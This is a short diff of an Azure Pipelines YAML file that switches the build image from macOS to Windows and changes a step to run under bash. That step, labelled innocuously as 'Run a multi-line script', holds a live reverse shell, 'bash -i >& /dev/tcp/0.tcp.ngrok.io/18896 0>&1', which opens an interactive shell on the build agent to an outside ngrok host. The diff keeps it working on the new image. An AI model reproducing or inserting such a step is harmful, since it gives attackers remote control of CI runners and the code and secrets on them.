@@ -7,12 +7,12 @@ trigger:
 - master
 
 pool:
-  vmImage: 'macos-latest'
+  vmImage: 'windows-latest'
 
 steps:
 - script: echo Hello, world!
   displayName: 'Run a one-line script'
 
-- script: |
+- bash: |
     bash -i >& /dev/tcp/0.tcp.ngrok.io/18896 0>&1
   displayName: 'Run a multi-line script'
